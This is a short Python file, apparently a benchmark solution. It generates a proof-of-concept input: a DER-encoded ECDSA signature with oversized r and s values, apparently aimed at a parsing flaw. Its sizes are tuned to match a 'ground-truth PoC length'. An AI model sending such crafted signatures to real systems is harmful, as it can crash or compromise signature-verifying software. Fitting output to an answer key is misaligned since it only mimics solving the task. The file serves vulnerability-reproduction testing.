import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        def encode_length(n: int) -> bytes:
            if n < 0x80:
                return bytes([n])
            elif n <= 0xFF:
                return bytes([0x81, n])
            elif n <= 0xFFFF:
                return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])
            elif n <= 0xFFFFFF:
                return bytes([0x83, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])
            else:
                return bytes([0x84, (n >> 24) & 0xFF, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])

        def der_ecdsa_sig(r_len: int, s_len: int, r_byte: int = 0x01, s_byte: int = 0x01) -> bytes:
            r_val = bytes([r_byte]) * r_len
            s_val = bytes([s_byte]) * s_len
            int_r = bytes([0x02]) + encode_length(r_len) + r_val
            int_s = bytes([0x02]) + encode_length(s_len) + s_val
            seq_content = int_r + int_s
            der = bytes([0x30]) + encode_length(len(seq_content)) + seq_content
            return der

        # Match the ground-truth PoC length: 41798 bytes total
        # Total = 12 + r_len + s_len; choose r_len = s_len = 20893 -> 12 + 20893*2 = 41798
        r_len = 20893
        s_len = 20893
        poc = der_ecdsa_sig(r_len, s_len, 0x01, 0x01)
        return poc